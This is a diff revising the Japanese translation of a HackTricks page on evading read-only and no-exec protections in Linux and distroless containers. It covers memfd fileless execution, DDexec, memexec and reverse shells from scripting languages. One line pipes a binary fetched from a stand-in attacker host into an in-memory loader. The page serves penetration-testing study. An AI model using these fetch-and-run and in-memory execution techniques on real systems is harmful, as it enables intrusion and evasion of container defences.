@@ -4,32 +4,32 @@
 
 <summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>
 
-HackTricksをサポートする他の方法:
+HackTricks をサポートする他の方法:
 
-* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見る
-* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**する
-* **ハッキングトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。
+* **HackTricks で企業を宣伝**したい場合や **HackTricks をPDFでダウンロード**したい場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェック！
+* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
+* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)** に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) をフォローする。
+* **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリにPRを提出する。
 
 </details>
 
-<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-**ハッキングキャリア**に興味がある方や**解読不能なものをハック**したい方 - **採用中です！**（_流暢なポーランド語の読み書きが必要です_）。
+**ハッキングキャリア**に興味がある方や **解読不能なものをハック**したい方 - **採用中です！**（_流暢なポーランド語の読み書きが必要です_）。
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 ## 動画
 
-以下の動画では、このページで言及されているテクニックがより詳しく説明されています:
+以下の動画では、このページで言及されているテクニックについてより詳しく説明されています:
 
-* [**DEF CON 31 - Linuxメモリ操作の探索**](https://www.youtube.com/watch?v=poHirez8jk4)
+* [**DEF CON 31 - ステルスおよび回避のためのLinuxメモリ操作の探索**](https://www.youtube.com/watch?v=poHirez8jk4)
 * [**DDexec-ngとインメモリdlopen()によるステルス侵入 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
 
 ## 読み取り専用 / 実行不可シナリオ
 
-**読み取り専用（ro）ファイルシステム保護**が**Linuxマシン**で**より一般的**になってきており、特にコンテナで見られます。これは、roファイルシステムでコンテナを実行するのは、`securitycontext`で**`readOnlyRootFilesystem: true`**を設定するだけで簡単だからです:
+**読み取り専用（ro）ファイルシステム保護**が **Linuxマシン**で **より一般的**になってきており、特にコンテナ内では **設定が簡単**であるためです。これは、`securitycontext` で **`readOnlyRootFilesystem: true`** を設定するだけでコンテナを **roファイルシステム**で実行できるためです:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
@@ -44,40 +44,40 @@ securityContext:
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-しかし、ファイルシステムがroとしてマウントされていても、**`/dev/shm`**は書き込み可能のままなので、ディスクに書き込むことができないわけではありません。ただし、このフォルダは**実行不可保護**でマウントされるため、ここにバイナリをダウンロードしても**実行できません**。
+しかし、ファイルシステムが **ro** でマウントされていても、**`/dev/shm`** は書き込み可能のままなので、ディスクに書き込むことができないというのは偽物です。ただし、このフォルダは **実行不可保護** でマウントされるため、ここにバイナリをダウンロードしても **実行できません**。
 
 {% hint style="warning" %}
-レッドチームの観点からすると、これにより、システムにないバイナリ（バックドアや`kubectl`のような列挙ツール）を**ダウンロードして実行するのが複雑**になります。
+レッドチームの観点からすると、これは既存のシステムにないバイナリ（バックドアや `kubectl` のような列挙ツール）を **ダウンロードして実行するのが複雑**になります。
 {% endhint %}
 
 ## 最も簡単なバイパス: スクリプト
 
-バイナリを言及しましたが、インタプリタがマシン内にある限り、**シェルスクリプト**（`sh`がインストールされている場合）や**Pythonスクリプト**（`python`がインストールされている場合）など、**任意のスクリプトを実行**できます。
+バイナリを言及しましたが、インタプリタがマシン内にある限り、**シェルスクリプト**（`sh` があれば）や **Pythonスクリプト**（`python` がインストールされていれば）など、**任意のスクリプトを実行**できます。
 
-ただし、これだけではバイナリバックドアや他の実行する必要があるバイナリツールを実行するのには十分ではありません。
+ただし、これだけではバイナリバックドアや実行する必要がある他のバイナリツールを実行するのには十分ではありません。
 
 ## メモリバイパス
 
-ファイルシステムがそれを許可していない場合にバイナリを実行したい場合、**メモリから実行**するのが最善です。なぜなら、**保護がそこには適用されない**からです。
+ファイルシステムがそれを許可していない場合にバイナリを実行したい場合、**メモリから実行する**のが最善です。なぜなら、**保護がそこには適用されない**からです。
 
-### FD + exec syscall バイパス
+### FD + exec シスコールバイパス
 
-マシン内に**Python**、**Perl**、**Ruby**などの強力なスクリプトエンジンがある場合、メモリから実行するためにバイナリをダウンロードし、メモリファイルディスクリプタに保存し（`create_memfd`システムコール）、これらの保護によって保護されないため、**fdをファイルとして実行する**という**`exec`システムコール**を呼び出すことができます。
+**Python**、**Perl**、**Ruby** などの強力なスクリプトエンジンがマシン内にある場合、メモリにバイナリをダウンロードして実行し、これらの保護によって保護されないメモリファイルディスクリプタ（`create_memfd` シスコール）に保存し、その後 **`exec` シスコール** を呼び出して **fd を実行するファイル** として指定します。
 
-これには、プロジェクト[**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec)を簡単に使用できます。バイナリを渡すと、**バイナリが圧縮されb64エンコード**されたスクリプトが生成され、`create_memfd`システムコールを呼び出して**バイナリを保存**し、**exec**システムコールを呼び出して実行する**手順**が記述された指定された言語のスクリプトが生成されます。
+これには、プロジェクト [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) を簡単に使用できます。バイナリを渡すと、バイナリが **b64エンコード** された **スクリプト** が生成され、`create_memfd` シスコールを呼び出して **fd** に保存されたバイナリを **デコードおよび解凍** する手順が記述され、それを実行する **exec** シスコールが呼び出されます。
 
 {% hint style="warning" %}
-これは、PHPやNodeなどの他のスクリプト言語では**スクリプトから生のシステムコールを呼び出すデフォルトの方法**がないため、`create_memfd`を呼び出して**バイナリを保存するためのメモリfd**を作成することはできません。
+これは、PHPやNodeなどの他のスクリプト言語では、スクリプトから **生のシスコールを呼び出すデフォルトの方法** がないため、`create_memfd` を呼び出して **バイナリを保存するメモリfd** を作成することができません。
 
-また、`/dev/shm`内のファイルで**通常のfd**を作成しても、**実行不可保護**が適用されるため、実行できません。
+また、`/dev/shm` 内のファイルで **通常のfd** を作成しても、**実行不可保護** が適用されるため、実行できません。
 {% endhint %}
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)は、**`/proc/self/mem`**を上書きすることで、**自分自身のプロセスのメモリを変更**する技術であり、**プロセスが実行しているアセンブリコード**を制御することで、**シェルコード**を書き込み、プロセスを**任意のコードを実行**するように「変異」させることができます。
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) は、自分自身のプロセスの **`/proc/self/mem`** を上書きすることで、**プロセスが実行しているアセンブリコードを制御**し、 **シェルコード** を書き込んでプロセスを **任意のコードを実行** するように "変異" させる技術です。
 
 {% hint style="success" %}
-**DDexec / EverythingExec**を使用すると、**自分自身のシェルコード**または**メモリ**から**任意のバイナリ**を**ロードして実行**できます。
+**DDexec / EverythingExec** を使用すると、自分自身のプロセスから **メモリ** から **自分自身のシェルコード** または **任意のバイナリ** を **ロードして実行** できます。
 {% endhint %}
 ```bash
 # Basic example
@@ -85,9 +85,9 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 ```
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec)はDDexecの自然な次のステップです。これは**DDexecシェルコードをデーモン化**したもので、異なるバイナリを実行したいときには、DDexecを再起動する必要はありません。代わりに、DDexec技術を使用してmemexecシェルコードを実行し、**このデーモンと通信して新しいバイナリをロードして実行**することができます。
+[**Memexec**](https://github.com/arget13/memexec)はDDexecの自然な次のステップです。これは**DDexecシェルコードをデーモン化**したもので、**異なるバイナリを実行**したいときには、DDexecを再起動する必要はありません。代わりに、DDexec技術を使用してmemexecシェルコードを実行し、**このデーモンと通信して新しいバイナリをロードして実行**できます。
 
-**memexecを使用してPHPリバースシェルからバイナリを実行する例**は、[https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php)にあります。
+**memexecを使用してPHPリバースシェルからバイナリを実行する例**は、[https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php)で見つけることができます。
 
 ### Memdlopen
 
@@ -97,16 +97,16 @@ DDexecと同様の目的を持つ[**memdlopen**](https://github.com/arget13/memd
 
 ### Distrolessとは
 
-Distrolessコンテナには、ライブラリやランタイム依存関係など、**特定のアプリケーションやサービスを実行するために必要な最小限のコンポーネント**のみが含まれており、パッケージマネージャーやシェル、システムユーティリティなどのより大きなコンポーネントは除外されています。
+Distrolessコンテナには、特定のアプリケーションやサービスを実行するために必要な**最小限のコンポーネント**だけが含まれており、パッケージマネージャーやシェル、システムユーティリティなどのより大きなコンポーネントは除外されています。
 
-Distrolessコンテナの目標は、**不要なコンポーネントを排除**することにより、コンテナの攻撃面を減らし、悪用される可能性のある脆弱性の数を最小限に抑えることです。
+Distrolessコンテナの目標は、**不要なコンポーネントを排除**し、悪用される可能性のある脆弱性の数を最小限に抑えることによって、コンテナの攻撃面を**縮小**することです。
 
 ### リバースシェル
 
-Distrolessコンテナでは、通常のシェルを取得するための`sh`や`bash`などが**見つからない**かもしれません。また、`ls`、`whoami`、`id`などのバイナリも見つけることはできません。これらは通常システムで実行するものです。
+Distrolessコンテナでは、通常のシェルを取得するための`sh`や`bash`などが**見つからない**かもしれません。`ls`、`whoami`、`id`などのバイナリも見つかりません...通常システムで実行するすべてのものが含まれていません。
 
 {% hint style="warning" %}
-したがって、通常どおりに**リバースシェルを取得**したり、システムを**列挙**することはできません。
+したがって、通常どおりに**リバースシェル**を取得したり、システムを**列挙**することはできません。
 {% endhint %}
 
 ただし、侵害されたコンテナが例えばflask webを実行している場合、Pythonがインストールされているため、**Pythonリバースシェル**を取得できます。Nodeを実行している場合はNodeリバースシェルを取得でき、ほとんどの**スクリプト言語**でも同様です。
@@ -123,7 +123,7 @@ Distrolessコンテナでは、通常のシェルを取得するための`sh`や
 
 **いくつかのRCE脆弱性を悪用して**、スクリプト言語の**リバースシェル**を取得し、メモリからバイナリを実行する方法の**例**は、[**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE)にあります。
 
-<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **ハッキングキャリア**に興味がある方や、**解読不能なものをハック**したい方 - **採用中です！**（_流暢なポーランド語の読み書きが必要です_）。
 
@@ -135,10 +135,10 @@ Distrolessコンテナでは、通常のシェルを取得するための`sh`や
 
 HackTricksをサポートする他の方法：
 
-* **HackTricksで企業を宣伝**したり、**HackTricksをPDFでダウンロード**したりするには、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* **HackTricksで企業を宣伝**したり、**PDFでHackTricksをダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れる
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを見つける
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
-* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のgithubリポジトリにPRを提出して、**ハッキングトリックを共有**してください。
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローする
+* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有する
 
 </details>
